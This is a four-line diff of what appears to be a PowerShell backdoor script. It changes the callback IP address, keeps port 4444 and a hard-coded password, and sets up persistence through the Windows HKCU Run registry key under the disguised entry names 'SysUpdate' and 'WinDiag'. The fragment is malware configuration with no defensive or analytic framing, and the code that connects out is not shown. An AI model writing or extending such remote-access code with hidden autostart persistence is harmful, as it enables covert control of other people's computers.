@@ -1,4 +1,4 @@
-$ip = '172.16.176.40'; $port = 4444; $pass = "Pico2026" 
+$ip = '192.168.1.15'; $port = 4444; $pass = "Pico2026" 
 $regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
 
 $regNames = @("SysUpdate", "WinDiag") 
